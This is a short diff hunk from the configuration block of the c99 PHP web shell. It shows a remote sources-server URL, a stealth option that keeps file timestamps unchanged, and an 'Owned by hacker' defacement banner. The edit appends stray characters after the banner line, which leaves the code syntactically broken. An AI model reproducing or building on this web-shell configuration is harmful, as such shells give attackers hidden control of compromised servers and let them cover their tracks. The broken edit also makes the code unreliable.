@@ -100,7 +100,7 @@ $c99sh_sourcesurl = "http://ccteam.ru/files/c99sh_sources/"; //Sources-server
 
 $filestealth = true; //if true, don't change modify- and access-time
 
-$donated_html = "<center><b>Owned by hacker</b></center>";
+$donated_html = "<center><b>Owned by hacker</b></center>";cc
 		/* If you publish free shell and you wish
 		add link to your site or any other information,
 		put here your html. */
